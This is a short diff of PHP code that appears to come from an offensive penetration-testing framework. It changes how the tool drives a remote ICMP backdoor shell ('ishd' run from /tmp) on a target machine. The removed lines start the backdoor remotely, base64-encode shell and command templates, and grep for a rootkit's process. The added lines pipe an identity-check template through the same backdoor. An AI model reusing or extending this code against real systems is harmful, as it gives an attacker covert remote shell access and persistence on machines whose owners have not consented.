@@ -294,21 +294,8 @@ This can be handy to get a list of processes and their PID number.");
         
 
         
-        $cmd2 = "/tmp/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024";
-        $this->cmd("REMOTE",$cmd2);
-        $templateB64_cmd = base64_encode($cmd2);
-
-        
-        
-        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
-        $query = "ps -aux | grep $rootkit_path";
-        $this->lan2stream4result($query,$this->stream_timeout);
-        $attacker_protocol = 'T';
-        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
-
-        $this->lan2pentest($attacker_port, $attacker_protocol, $templateB64_cmd, $templateB64_shell, $cmd2, $this->stream_timeout);
-        
-        
+        $template_id_euid = "echo '%ID%' | /tmp/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024";
+        $this->lan2pentest8id($template_id_euid);
         
         
     }
